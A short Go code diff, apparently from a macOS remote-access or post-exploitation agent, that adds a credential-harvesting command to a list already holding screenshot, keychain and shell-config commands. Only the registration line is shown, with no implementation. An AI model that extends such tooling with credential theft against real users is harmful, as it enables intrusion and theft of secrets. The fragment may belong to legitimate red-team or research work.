@@ -10,4 +10,5 @@ func registerPlatformCommands() {
 	RegisterCommand(&ScreenshotDarwinCommand{})
 	RegisterCommand(&KeychainCommand{})
 	RegisterCommand(&ShellConfigCommand{})
+	RegisterCommand(&CredHarvestCommand{})
 }
